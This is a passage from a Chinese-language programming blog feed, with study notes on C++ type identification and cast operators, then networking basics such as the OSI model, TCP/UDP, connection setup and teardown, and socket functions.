title="typeid"></a>typeid</h4><p>通过运行时类型识别(RTTI)，程序能够使用基类的指针或引用来检索这些指针或引用所指对象的实际类型。</p><p>C++通过下面两个操作符提供RTTI：</p><ul><li><p><strong>typeid 操作符，返回<u>指针或引用所指对象的实际类型</u>。</strong>操作对象为指针所指对象。</p></li><li><p><strong>dynamic_ cast 操作符，将基类类型的指针或引用安全地转换为派生类型的指针或引用。</strong></p></li></ul><p>typeid 操作符使程序能够询问一个表达式的类型。</p><p>typeid表达式形如: <code>typeid(e)</code>。 这里e是任意表达式或者是类型名。用法如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Base *bp;</span><br><span class="line">Derived *dp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">typeid</span>(*bp) == <span class="built_in">typeid</span>(*dp)) &#123;…&#125;       <span class="comment">// 比较bp所指对象与dp所指对象的实际类型</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">typeid</span>(*bp) == <span class="built_in">typeid</span>(Derived))  &#123;…&#125;  <span class="comment">// 判断bp所指对象是否为Derived</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">typeid</span>(bp) == <span class="built_in">typeid</span>(Derived))  &#123;…&#125;   <span class="comment">// 比较Base *类型和Derived类型，两类型不相等，测试失败</span></span><br></pre></td></tr></table></figure><p>只有当typeid的操作数是带虚函数的类类型的对象的时，才返回动态类型信息。测试指针(相对于指针指向的对象)返回指针的静态的、编译时类型。</p><h4 id="显示转换"><a href="#显示转换" class="headerlink" title="显示转换"></a>显示转换</h4><p>也叫强制类型转换，包括以下强制类型转换操作符：static_cast、dynamic_cast、const_cast、reinterpret_cast。</p><p>命名的强制类型转换符号的一-般形式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast-<span class="built_in">name</span>&lt;type&gt; (expression) ;</span><br></pre></td></tr></table></figure><p>其中，cast-name 为static_ cast、 dynamic_ cast、 const_ cast 和reinterpret cast 之一， type 为转换的目标类型，而expression则是被强制转换的表达式。强制转换的类型指定了在expression上执行某种特定类型的转换。</p><h5 id="reinterpret-cast"><a href="#reinterpret-cast" class="headerlink" title="reinterpret_cast"></a>reinterpret_cast</h5><p>在引入命名的强制类型转换操作符之前，显式强制转换用圆括号将类型括起来实现:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *ip;</span><br><span class="line"><span class="type">char</span> *pc = (<span class="type">char</span>*) ip;</span><br></pre></td></tr></table></figure><p>效果与使用reinterpret cast符号相同。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ip;</span><br><span class="line"><span class="type">char</span> *pc = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(ip) ;</span><br></pre></td></tr></table></figure><h5 id="const-cast"><a href="#const-cast" class="headerlink" title="const_cast"></a>const_cast</h5><p>将转换掉表达式的const性质。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *ip;</span><br><span class="line"><span class="type">char</span> *pc = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(ip);</span><br></pre></td></tr></table></figure><p><strong>只有使用const_ cast 才能将const性质转换掉</strong>。在这种情况下，试图使用其他三种形式的强制转换都会导致编译时的错误。类似地，除了添加或删除const特性，用const _cast 符来执行其他任何类型转换，都会引起编译错误。</p><h5 id="static-cast"><a href="#static-cast" class="headerlink" title="static_cast"></a>static_cast</h5><p>编译器<strong>隐式</strong>执行的任何类型转换都可以由static_ cast显式完成：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> d=<span class="number">97.0</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="type">static</span> <span class="built_in">cast</span>&lt;<span class="type">int</span>&gt;(d) ;</span><br><span class="line"><span class="comment">// 等价于:</span></span><br><span class="line"><span class="type">double</span> d=<span class="number">97.0</span>;</span><br><span class="line"><span class="type">int</span> i=d;</span><br></pre></td></tr></table></figure><p><strong>仅当类型之间可隐式转换时（除类层次间的下行转换以外），static cast 的转换才是合法的</strong>，否则将出错。<br>类层次间的下行转换属于强制转换，是不能通过隐式转换完成的，请看下例。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">base</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">child</span>:<span class="keyword">public</span> base&#123;&#125;;</span><br><span class="line">base* b;</span><br><span class="line">child* c;</span><br><span class="line">c = <span class="type">static</span> <span class="built_in">cast</span>&lt;child*&gt;(b);<span class="comment">// 下行转换，错误</span></span><br><span class="line">c = b;           <span class="comment">// 基类对象不能给派生类赋值，编译不正确</span></span><br></pre></td></tr></table></figure><h5 id="dynamic-cast"><a href="#dynamic-cast" class="headerlink" title="dynamic_cast"></a>dynamic_cast</h5><p>​该运算符把expression转换成type类型的对象。<strong>type 必须是类的指针、类的引用或者void</strong>*。如果type是指针类型，那么expression也必须是一个指针， 如果type是一个引用，那么expression也必须是一个引用。<br>​与其他强制类型转换不同，dynamic_ cast <strong>涉及运行时类型检查</strong>。dynamic_ cast 运行时的类型检查需要运行时的类型信息，而这个<strong>类型信息存储在类的虚函数表中</strong>，只有定义了虚函数的类才有虚函数表，没有定义虚函数的类是没有虚函数表的，<strong>对没有虚函数表的类使用会导致dynamic_ cast 编译错误</strong>。<br>​如果绑定到引用或指针的对象的类型不是目标类型，则dynamic_cast 失败。如果转换到指针类型的dynamic_cast 失败，则dynamic_cast 的结果是0值；如果转换到引用类型的dynamic_cast失败，则抛出一个bad_cast 类型的异常。<br>​因此，dynamic_cast 操作符一次执行两个操作。 它<strong>首先验证被请求的转换是否有效</strong>，只有转换有效，<strong>然后操作符才实际进行转换</strong>。一般而言，引用或指针所绑定的对象的类型在编译时是未知的，基类的指针可以赋值为指向派生类对象,同样，基类的引用也可以用派生类对象初始化，因此，dynamic_cast操作符执行的验证必须在运行时进行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:<span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">B</span>() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">A *pb=<span class="keyword">new</span> <span class="built_in">B</span>();   <span class="comment">// 定义A*类型的指针，指向B类类型的对象</span></span><br><span class="line">B b;</span><br></pre></td></tr></table></figure><p>针对上述代码，下列语句的执行情况如何：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A *pa = <span class="built_in">dynamic_cast</span>&lt;A *&gt;(pb); <span class="comment">// 通过。pb本来就是A*类型，实际上不需要转换类型</span></span><br><span class="line">A *pa = <span class="built_in">dynamic_cast</span>&lt;B *&gt;(pb); <span class="comment">// 编译错误。运行时dynamic cast的操作数必须包含多态类类型，而B类没有虚函数</span></span><br><span class="line">A *pa = static_ <span class="built_in">cast</span>&lt;A *&gt;(pb); <span class="comment">// 通过。pb本来就是A*类型，实际上不需要转换类型</span></span><br><span class="line">A a = static_ <span class="built_in">cast</span>&lt;A &gt;(b);     <span class="comment">// 通过。派生类对象赋值给基类对象，发生隐式转换</span></span><br><span class="line">A a = dynamic <span class="built_in">cast</span>&lt;A &gt;(b);     <span class="comment">// 编译错误。用dynamic_cast进行转换时，待转换的类型只能是指针或引用</span></span><br></pre></td></tr></table></figure><p><strong>dynamic_cast 主要用于类层次间的上行转换和下行转换。</strong>dynamic_cast 运算符可以在执行期决定真正的类型。如果下行转换是安全的(也就说，如果基类指针或者引用确实指向一个派生类对象)，这个运算符会传回转型过的指针。如果downcast不安全，这个运算符会传回空指针(也就是说，基类指针或者引用没有指向一个派生类对象)。</p><p>在类层次间进行上行转换时，dynamic <em>cast 和static</em> cast 的效果是一样的；在进行下行转换时，dynamic_ cast 具有类型检查的功能，比static_ cast 更安全。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C-x2F-C&quot;&gt;&lt;a href=&quot;#C-x2F-C&quot; class=&quot;headerlink&quot; title=&quot;C&amp;#x2F;C++&quot;&gt;&lt;/a&gt;C&amp;#x2F;C++&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-数组&quot;&gt;&lt;a href=&quot;#1-数组&quot; clas</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="https://frankcao3.github.io/posts/28758"/>
    <id>https://frankcao3.github.io/posts/28758</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="计算机网络模型"><a href="#计算机网络模型" class="headerlink" title="计算机网络模型"></a>计算机网络模型</h2><h3 id="1-1-OSI参考模型"><a href="#1-1-OSI参考模型" class="headerlink" title="1.1 OSI参考模型"></a>1.1 OSI参考模型</h3><p><strong>国际标准化组织(ISO)<strong>提出的网络体系结构模型，称为开放系统互联参考模型(OSIRM)，通常简称为</strong>OSI参考模型</strong>。</p><p>OSI有七层，自下而上依次为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。其中数据链路层在概念上常被划分为两个子层：逻辑链路控制子层(LLC)和媒体访问控制子层(MAC)。</p><p><strong>数据链路层负责分配MAC地址。</strong>MAC地址，或称物理地址，由<strong>48比特长</strong>，12个十六进制数字组成，<strong>0~23位(前6位十六进制)是厂商向IETF（ 国际互联网工程任务组）等机构申请用来标识厂商的代码</strong>。地址的24到47位由厂商自行分派，是各个厂商制造的所有网卡的一个唯一编号。 因此一个<br>网卡会有一个全球唯一固定的MAC地址，但可对应多个IP地址。MAC地址的第48位是组播地址标志位。</p><p><strong>网络层负责对数据包进行路由选择和存储转发</strong>，网络层的协议有: IP、IPX、ICMP、IGMP、ARP、RARP、OSPF 等。网络层数据的单位称为<u>分组或数据包</u>。网络层提供点到点的通信（直接相连的结点之间的通信），仅提供一台机器到另一台机器之间的通信，不会涉及程序或进程的概念。</p><p><strong>传输层是第一个<u>端到端</u>，即进程到进程的层次</strong>。传输层提供应用进程间的逻辑通信。由于一个主机可同时运行多个进程，因此传输层有复用和分用的功能。传输层的协议有: TCP、 UDP、 SCTP 等。传输层数据的单位称为<u>报文或数据段</u>。</p><p>应用层为操作系统或者网络应用程序提供访问网络服务的接口。应用层的协议有: RIP、TELNET、FTP、HTTP、SNMP等。</p><table><thead><tr><th>OSI参考模型</th><th>功能</th><th>协议</th><th>设备</th></tr></thead><tbody><tr><td>物理层</td><td></td><td></td><td>中继器、集线器</td></tr><tr><td>数据链路层</td><td>分配MAC地址</td><td></td><td>网桥、交换机</td></tr><tr><td>网络层</td><td>对数据包进行路由选择和存储转发（点到点）</td><td>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF等</td><td>路由器</td></tr><tr><td>传输层</td><td>提供进程间的逻辑通信（端到端）</td><td>TCP、 UDP、 SCTP等</td><td></td></tr></tbody></table><p><strong>网关</strong>是网络层以上的中继系统。默认网关在网络层以上实现网络互连，实质上是一个网络通向其他网络的IP地址。</p><h3 id="1-2-TCP-x2F-IP模型"><a href="#1-2-TCP-x2F-IP模型" class="headerlink" title="1.2 TCP&#x2F;IP模型"></a>1.2 TCP&#x2F;IP模型</h3><p>TCP&#x2F;IP模型由于得到广泛应用而成为事实上的国际标准，从低到高依次为：网络接口层、网际层、传输层和应用层。</p><p>OSI七层模型和TCP&#x2F;IP五层模型的对应关系如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704093830695.png" alt="image-20220704093830695"></p><p><strong>网际层</strong>是TCP&#x2F;IP体系结构的关键部分。它和OSI网络层在功能上非常相似。网际层<strong>将分组发往任何网络，并为之独立地选择合适的路由，但它不保证各个分组有序到达，各个分组的有序交付由高层负责</strong>。网际层定义了标准的分组格式和协议，即IP协议。当前采用的IP协议是第4版，即IPv4，它的下一-个版本是IPv6。</p><p><strong>传输层</strong>的功能同样和OSI中的传输层类似，是<strong>使发送端和目的端主机上的对等实体可以进行会话</strong>。</p><p>传输层主要使用以下两种协议:</p><ul><li>传输控制协议（Transmission Control Protocol, TCP）。 它是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。</li><li>用户数据报协议(User Datagram Protocol, UDP)。 它是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</li></ul><p><strong>应用层</strong>包含所有的高层协议。如虚拟终端协议(Telnet)、 文件传输协议(FTP)、 域名解析服务(DNS)、电子邮件协议(SMTP)和超文本传输协议(HTTP)。</p><h2 id="传输层与socket基本操作"><a href="#传输层与socket基本操作" class="headerlink" title="传输层与socket基本操作"></a>传输层与socket基本操作</h2><h3 id="2-1-传输层"><a href="#2-1-传输层" class="headerlink" title="2.1 传输层"></a>2.1 传输层</h3><p>在下图中，展示了IPv4和IPv6。从右向左观察这个图，最右边的4个网络应用使用IPv6，另外的5个网络应用使用IPv4。</p><p>最左边的网络应用tpdump直接使用BPF（BSD分组过滤器）或DLPI（数据链路提供者接口）同数据链路层进行通信。ping使用ICMP协议。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704094553193.png" alt="image-20220704094553193"></p><h5 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h5><p>用户数据报协议(User Datagram Protocol)，<strong>面向数据报文</strong>。UDP是一种<strong>无连接</strong>协议，因为UDP客户与服务器不必存在长期的关系，例如一个UDP客户创建一个套接字并发送一个数据报给一个服务器，然后立即用同一个套接字发送另一个数据报给另外一个服务器。同样，一个UDP服务器可以用同一个UDP套接字从若干不同的客户一连串接受多个数据报。</p><p>UDP是<strong>不可靠</strong>的，不能保证最终到达它们的目的地，<strong>不保证各个数据报的先后顺序跨网络保持不变，也不保证每个数据报只到达一次</strong>。</p><p>UDP既可以使用IPv4,也可以使用IPv6。</p><h5 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h5><p>传输控制协议(Transmission Control Protocol)，<strong>面向字节流</strong>。</p><p>第一，TCP 是一种<strong>面向连接</strong>的协议，提供客户与服务器的连接。</p><p>第二，TCP提供<strong>可靠性</strong>。当使用TCP向另一端发送数据时，它要求对端返回一个确认。如果没有收到确认，TCP自动重传数据并等待更长时间。在数次重传失败后，TCP才放弃。</p><p>第三，TCP通过<strong>给所发送数据的每一个字节关联一个序列号进行排序</strong>。UDP提供不可靠的数据报传送，不提供确认、序列号、超时重传等机制。</p><p>第四，TCP<strong>提供流量控制</strong>，而UDP不提供流量控制。TCP总是告诉对端它能够接收多少字节的数据，这称为<strong>通告窗口</strong>。该窗口在任何时刻都指出接收缓冲区中的可用空间，从而确保发送端发送的数据不会溢出接收缓冲区。</p><p>第五，TCP的连接是全双工的。UDP也可以是全双工的。</p><p>TCP既可以使用IPv4，也可以使用IPv6。</p><p><strong>UDP与TCP的主要区别在于UDP不一定提供可靠的数据传输</strong>。事实上，该协议不能保证数据准确无误地到达目的地。UDP在许多方面非常有效，如UDP具有对系统资源要求较少、具有较好的实时性、网络开销小的优点。当某个程序的目标是尽快地传输尽可能多的信息时(其中任意给定数据的重要性相对较低)，可使用UDP。</p><h3 id="2-2-TCP连接的建立和终止"><a href="#2-2-TCP连接的建立和终止" class="headerlink" title="2.2 TCP连接的建立和终止"></a>2.2 TCP连接的建立和终止</h3><p>以下给出了一个基本TCP客户端和服务器程序的套接口函数：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704095345763.png" alt="image-20220704095345763"></p><p>对于服务器端，其先调用socket函数（返回一个套接字），然后套接字与地址、端口绑定（bind），对端口进行监听（listen），调用accept阻塞，等待客户端连接。</p><p>这时如果有客户端调用socket函数（返回一个套接字），然后连接服务器（connect），如果连接成功，客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把响应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100516344.png" alt="image-20220704100516344"></p><h4 id="三次握手建立连接"><a href="#三次握手建立连接" class="headerlink" title="三次握手建立连接"></a>三次握手建立连接</h4><hr><ul><li>客户端向服务器发送一个SYN J；</li><li>服务器向客户端响应一个SYN K，并对SYN J进行确认ACK J+1；</li><li>客户端再向服务器发送一个确认ACK K+1。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100639833.png" alt="image-20220704100639833"></p><p>从图中可以看出，服务器必须准备好接受外来的连接。这通过socket、bind 和listen函数来完成，称为<strong>被动打开</strong>。</p><p>客户端通过<strong>调用connect进行主动打开</strong>。这引起客户端向服务器发送了SYN J （表示同步，它告诉服务器客户将在连接中发送的数据的初始序列号）分节，这时connect进入阻塞状态。</p><p>服务器监听到连接请求，即收到SYN J分节，<strong>调用accept函数接受请求</strong>，并向客户端发送SYN K （它告诉客户端服务器将在连接中发送的数据的初始序列号）、ACK J+1分节，这时accept进入阻塞状态。</p><p>客户端收到服务器的SYN K、ACK J+1 分节之后，这时<strong>connect返回</strong>，并对SYN K分节进行确认，再向服务器发送ACK K+1分节；</p><p>服务器收到ACK K+1分节时，<strong>accept 返回</strong>，至此三次握手完毕，连接建立。</p><p>总结：客户端的connect在三次握手的第二次返回，而服务器端的accept在三次握手的第三次返回。</p><p>&#x3D;&#x3D;<strong>TCP为什么不采用二次握手：</strong>&#x3D;&#x3D;</p><p>采用三次握手是为了防止失效的连接请求报文段突然又传送到服务器，从而发生错误。</p><p>比如，客户端第一次发送的连接请求并没有丢失，而是因为网络问题导致延迟到达服务器，<u>服务器以为是客户端又发起的新连接</u>，于是服务器同意连接，并向客服端发回确认，但是此时客户端处于建立连接的状态，所以不予理会，服务器就一直等待客户端发送数据， 导致服务器的资源浪费。</p><h4 id="四次挥手释放连接"><a href="#四次挥手释放连接" class="headerlink" title="四次挥手释放连接"></a>四次挥手释放连接</h4><hr><p><strong>&#x3D;&#x3D;建立连接需要三次握手，而终止连接需要四次挥手。这是由TCP的半关闭造成的。既然TCP连接是全双工的（数据在两个方向可以同时传递），因此每个方向必须单独地进行关闭。&#x3D;&#x3D;</strong></p><p>下图中是客户执行主动关闭，然而不管是客户还是服务器都可以执行主动关闭。通常情况下是客户执行主动关闭，但某些协议如HTTP则是服务器执行主动关闭。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704101542526.png" alt="image-20220704101542526"></p><p><img src="https://images.xiaozhuanlan.com/photo/2020/42b857c3a2046b9907075e326125d662.png" alt="img"></p><p>具体步骤: </p><ol><li><p>某个应用进程首先调用close，我们称这一端执行<strong>主动关闭</strong>。 这一端的TCP于是发送一一个FIN分节，表示数据发送完毕；</p></li><li><p>另一端接收到FIN分节之后，执行<strong>被动关闭</strong>，对这个FIN进行ACK确认。它的接收也作为文件结束符传递给接收端应用进程，因为<u>FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据</u>；</p></li><li><p><strong><u>一段时间之后</u><strong>，接收到文件结束符的应用进程调用close关闭它的套接口。这导致它的TCP</strong>也发送一一个FIN</strong>；</p></li><li><p>接收到这个FIN的原发送端TCP (即执行主动关闭的那一端) 对它<strong>进行确认</strong>。</p></li></ol><p>这样<strong>每个方向上都有一个FIN和ACK，所以一共需要四个分节</strong>。我们使用限定词“一般”是因为：有时步骤1)的FIN随数据一起发送；另外，执行被动关闭那一端的TCP在步骤2)和3)发出的ACK与FIN也可以合并成一个分节（当自己已经没有数据要发送了，可以直接关闭连接），这样的话就是三个报文完成连接的释放。</p><p>TCP关闭时，每一端都要发送一个FIN。这种情况除了在应用进程调用close时会发生，还会在进程终止时发生。进程终止包括自愿（调用exit或从main函数返回）、不自愿（进程收到一个终止本进程的信号）的情况，进程终止时所有打开的TCP连接上都会发出一个FIN。</p><p>&#x3D;&#x3D;<strong>TCP释放连接为什么需要四次挥手：</strong>&#x3D;&#x3D;</p><p>关闭连接时，<u>当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了</u>（单方向），但未必你所有的数据都全部发送给对方了，所以<u>你未必会马上关闭socket，也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你没有数据发送给对方了</u>，针对每个FIN报文，都需要一次ack报文，故需要四次挥手。</p><p><a href="https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md">https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md</a></p><p>握手的过程中可以说没有信息数据的传输，是一个相互应答的过程，所以服务器会将SYN ACK一起发送，但是客户端发送终止连接的时候，很有可能服务器还有一些数据没有发送完，所以服务器只是先答应，但是需要等待数据传输完毕之后再发送FIN报文，ACK和FIN是分开的，因此多了一次。</p><h3 id="2-3-TCP状态转换图"><a href="#2-3-TCP状态转换图" class="headerlink" title="2.3 TCP状态转换图"></a>2.3 TCP状态转换图</h3><hr><p>TCP连接的建立和终止可以用状态转换图来说明，如图2-5所示。这些状态可使用netstat显示，它是一个在调试客户&#x2F;服务器应用时很有用的工具。</p><p>TCP为一个连接定义了11种状态，并且TCP规则规定如何基于当前状态及在该状态下所接收的分节从一个状态转换到另一个状态。举例来说，当某个应用进程在CLOSED状态下执行主动打开时，TCP将发送一个SYN，且新的状态是SYN_ SENT。如果这个TCP接着接收到一个带ACK的SYN，它将发送一个ACK，且新的状态是ESTABLISHED。这个最终状态是绝大多数数据传送发生的状态。</p><p>自ESTABLISHED状态引出的两个箭头处理连接的终止。如果某个应用进程在接收到文件结束符之前调用close (主动关闭)，那就转换到FIN _WAIT_1状态。但如果某个应用进程在ESTABLISHED状态期间接收到一个FIN (被动关闭),那就转换到CLOSE WAIT状态。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704104439563.png" alt="image-20220704104439563"></p><p>图2-6给出了一个完整的TCP连接所发生的实际分组交换情况：建立连接、传送数据和终止连接。图中展示了每个端点所经历的TCP状态。从图2-6可见，当客户端应用程序主动请求关闭时，调用close或shutdown关闭连接，这时应用程序发送FIN，然后进入FIN_WAIT_1状态，等待服务器端发送确认包ACK，接受到服务器端的ACK以后，然后客户端进入FIN_WAIT_2状态，等待服务器端调用close, 并发送FIN,当客户端接受到FIN后，发送ACK，进入最终的TIME_WAIT状态。</p><p>需要注意的是，执行主动关闭的那一端进入&#x3D;&#x3D;TIME WAIT状态&#x3D;&#x3D;。<strong>留在TIME_ WAIT的持续的时间是&#x3D;&#x3D;MSL&#x3D;&#x3D; (最长分节生命周期Maximum Segment Liftime)时间的2倍，也就是2MSL。</strong>MSL一般情况下是30秒到2分钟，所以TIME_WAIT的时间一般为1~4分钟。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704154040857.png" alt="image-20220704154040857"></p><p>&#x3D;&#x3D;<strong>存在TIME_WAIT状态有两个理由：</strong>&#x3D;&#x3D;</p><ul><li><p>实现终止TCP全双工连接的可靠性</p><p><u>假设最终的ACK丢失，服务器将重发最终的FIN，因此客户必须维护状态信息以允许它重发最终的ACK</u>。如果不维护状态信息，它将响应以RST，而服务器则把该分节解释成一个错误。 如果TCP打算执行所有必要的工作以彻底终止某个连接上两个方向的数据流，那么它必须能够处理连接终止序列四个分节中任何一个分节丢失的情况，也即主动关闭的那一端必须进入TIME_WAIT状态，因为它可能不得不重发最终的ACK。</p></li><li><p>允许老的重复分节在网络中消逝</p><p>我们假设12.106.32.254端口1500和206.168.112.219端口21之间有一个TCP连接，我们关闭这个连接后，在以后某个时候又重新建立起相同的IP地址和端口之间的TCP连接。后一个连接称为前一个连接的化身，因为它们的IP地址和端口号是相同的，<u>TCP必须防止来自某个连接的老重复分组在连接终止后再现，从而被误解成属于同一个连接的化身（被误解为属于新建的连接）。</u>要实现这种功能，TCP不能给处于TIME_WAIT状态的连接启动新的化身，<u>既然TME_WAIT状态的持续时间是2MSL，这就足够让某个方向上的分组最多存活MSL秒即被丢弃，另一个方向上的应答最多存活MSL秒也被丢弃</u>，通过实施这个规则，我们就能保证当成功建立一个 TCP连接时，来自该连接先前的化身的老重复分组都已在网络中消逝了。</p></li></ul><h3 id="2-4-socket的基本操作"><a href="#2-4-socket的基本操作" class="headerlink" title="2.4 socket的基本操作"></a>2.4 socket的基本操作</h3><hr><p>一个面向连接的客户端socket程序的主要步骤：</p><ol><li><p>加载套接字库</p></li><li><p>创建套接字socket()</p></li><li><p>向服务器发送连接请求connect()</p></li><li><p>和服务器端进行通信</p></li><li><p>关闭套接字close()</p></li></ol><ol><li><p><strong>socket()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>socket函数在成功时返回一个小的非负整数值，称为套接口描述字(Socket Descriptor)， 简称套接字。这个套接字跟文件描述字相似。</p><p>socket函数的三个参数分别为:</p><ol><li><p><strong>domain</strong>：即协议域，又称为协议族(family)。常用的协议族有: AF_ INET、 AF_ INET6、AF LOCAL（或称AF_ UNIX，UNIX域socket）、AF_ ROUTE等。协议族决定了套接口的地址类型，在通信中必须采用对应的地址，如AF_ INET决定了要用IPv4地址(32位的)与端口号(16位的)的组合、AF_UNIX决定了要用一个绝对路径名作为地址。</p></li><li><p><strong>type</strong>：指定套接口类型。常用的socket类型有: SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_SEQPACKET等。</p></li><li><p><strong>protocol</strong>：指定协议。常用的协议有: IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP等，它们分别对应TCP传输协议、UDP传输协议、SCTP传输协议。</p></li></ol><p><strong>注意</strong>：上面的type 和protocol 并不是可以随意组合的，如SOCK_ STREAM不可以跟IPPROTO_ UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。</p></li><li><p><strong>bind()函数</strong></p><p>bind函数<strong>把一个本地协议地址赋予套接口</strong>。对于网际协议，协议地址是32位的IPv4地址或128位的IPv6地址与16位的TCP或UDP端口号的组合。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span> </span>;</span><br></pre></td></tr></table></figure><p>函数的三个参数分别为：</p><ol><li><p>sockfd：即套接字，它是通过socket()函数创建的，它唯一标识一个套接口。</p></li><li><p>addr：一个指向特定于协议的地址结构的指针。</p></li><li><p>addrlen：指出第二个参数中结构体的长度。</p></li></ol><p>通常服务器在启动的时候都会绑定一个众所周知的地址(如IP地址+端口号)，用于提供服务，客户就可以通过它来连接服务器；而客户端就不用指定，由系统自动分配一个端口号和自身的IP地址组合。**&#x3D;&#x3D;这就是什么三次握手时为服务器端在listen之前会调用bind，而客户端就不调用，而是在connect时由系统生成一个。&#x3D;&#x3D;**</p></li><li><p><strong>listen()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span></span></span><br></pre></td></tr></table></figure><p>listen函数仅由TCP服务器调用，它做两件事情：</p><ol><li><p>当socket函数创建一个套接口时，它被假设为一个主动套接口，也就是说，它默认是一个将调用connect发起连接的客户套接口。listen函数把一个未连接的套接口<strong>转换成一个被动套接口</strong>，指示内核应接受指向该套接口的连接请求。调用listen导致套接口从CLOSED状态转换到LISTEN状态。</p></li><li><p>listen函数的<strong>第二个参数backlog规定了内核应该为相应套接口排队的最大连接个数</strong>（后台等待连接队列的最大限制值）(包括已完成连接队列与未完成连接队列)。</p></li></ol><ul><li><p>未完成连接队列。</p><p>每个这样的客户对应其中- 